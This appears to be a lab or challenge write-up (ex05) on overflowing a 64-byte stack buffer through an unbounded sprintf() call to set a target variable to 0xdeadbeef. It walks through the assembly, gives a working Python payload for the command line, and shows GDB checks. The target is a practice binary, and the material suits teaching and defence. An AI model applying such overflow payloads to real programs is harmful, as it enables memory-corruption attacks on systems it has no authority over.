# ex05 — Overwrite a Target Variable with `argv`

## Goal

Use `sprintf()` to overflow a buffer and set a `target` variable to `0xdeadbeef`:

```
you have hit the target correctly :)
```

## Concept

This challenge uses `sprintf()` as the vulnerable function. Unlike `strcpy()` which copies a string, `sprintf()` writes formatted output to a buffer. If the formatted output exceeds the buffer size, it overflows.

### Why `sprintf()` is dangerous

`sprintf(dest, format, ...)` writes formatted data to `dest` with no bounds checking. If the formatted string is longer than `dest`, it overflows. The safe alternative is `snprintf(dest, size, format, ...)` which limits the output size.

## Memory Layout

```
Higher addresses
┌─────────────────────────────┐
│  target (4 bytes)           │  [ebp-0xc]  ← target: must be 0xdeadbeef
├─────────────────────────────┤
│  ... (padding)              │
├─────────────────────────────┤
│  buffer (64 bytes)          │  [ebp-0x4c] ← sprintf writes here
├─────────────────────────────┤
│  ...                        │
Lower addresses
```

The buffer is at `[ebp-0x4c]` and the target is at `[ebp-0xc]`. The offset is `0x4c - 0xc = 0x40 = 64` bytes.

## Relevant Assembly (`vuln`)

```asm
080483f4 <vuln>:
    push   ebp
    mov    ebp, esp
    sub    esp, 0x68                  ; allocate 104 bytes

    mov    DWORD PTR [ebp-0xc], 0x0   ; target = 0

    mov    eax, DWORD PTR [ebp+0x8]   ; eax = argv[1]
    mov    DWORD PTR [esp+0x4], eax   ; arg2 = argv[1]

    lea    eax, [ebp-0x4c]            ; eax = &buffer[0]
    mov    DWORD PTR [esp], eax       ; arg1 = buffer
    call   sprintf                    ; sprintf(buffer, argv[1]) — NO BOUNDS CHECK

    mov    eax, DWORD PTR [ebp-0xc]   ; eax = target
    cmp    eax, 0xdeadbeef            ; compare with expected value
    jne    ...                        ; if not equal, fail
```

### Step-by-step analysis

| Instruction | What it does |
|---|---|
| `mov [ebp-0xc], 0x0` | Initializes `target = 0` |
| `mov eax, [ebp+0x8]` | Gets `argv[1]` |
| `call sprintf` | Copies `argv[1]` into buffer (no bounds check) |
| `cmp eax, 0xdeadbeef` | Checks if target equals `0xdeadbeef` |

## Exploit

The value `0xdeadbeef` in little-endian is the byte sequence `\xef\xbe\xad\xde`:

```bash
./bin "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"
```

### Why it works

- `sprintf(buffer, argv[1])` copies the argument string into the 64-byte buffer
- 64 bytes of `"A"` fill the buffer
- The next 4 bytes (`\xef\xbe\xad\xde`) overwrite `target`
- In little-endian, this is the value `0xdeadbeef`
- The comparison succeeds

### Little-endian explanation

```
Memory address:  [ebp-0xc]  [ebp-0xb]  [ebp-0xa]  [ebp-0x9]
Byte value:       0xef        0xbe        0xad        0xde

As a 32-bit integer (little-endian): 0xdeadbeef
```

## GDB Verification

```bash
gdb -q ./bin
```

```gdb
# Break after sprintf returns
break *0x08048413
run "$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')"

# Check the target variable
x/wx $ebp-0xc
# Output: 0xdeadbeef

# Check the bytes
x/4xb $ebp-0xc
# Output: 0xef  0xbe  0xad  0xde

# Check the buffer
x/16xb $ebp-0x4c
# Output: 0x41  0x41  0x41  0x41 ...

# Continue to see success
continue
```

## Key Takeaway

`sprintf()` is as dangerous as `strcpy()` when used with untrusted input. Always use `snprintf()` with a size limit. This challenge also shows that the vulnerability can come from different functions — the key is always **lack of bounds checking**.
